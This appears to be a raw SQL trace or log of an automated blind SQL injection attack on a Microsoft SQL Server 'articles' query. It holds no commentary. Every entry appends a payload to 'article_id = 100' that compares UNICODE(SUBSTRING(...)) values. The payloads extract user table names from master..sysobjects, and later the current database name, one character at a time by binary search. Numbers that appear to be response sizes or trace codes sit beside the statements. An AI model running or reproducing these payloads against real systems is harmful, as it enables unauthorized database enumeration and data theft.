+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>114	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>115	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>104	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>108	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>106	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>105	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>104	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>108	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>110	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>111	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>96	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>112	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>104	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>108	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>110	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),10,1))>109	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>96	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>48	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>72	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>84	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>90	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>93	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>94	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),11,1))>95	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>64	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>96	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>112	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>104	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>108	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>106	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),12,1))>107	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>96	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>112	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>104	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>100	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>102	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),13,1))>101	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>96	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>112	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>120	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>124	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>122	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),14,1))>121	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>96	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>112	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>120	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>116	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>114	453
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),15,1))>115	453
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),16,1))>96	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),16,1))>48	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),16,1))>1	451
+	66
+	138
+	66
+use [master]	86
+	66
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>64	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>96	210
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>112	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>104	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>108	211
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>110	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>109	211
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1))>96	210
+	200
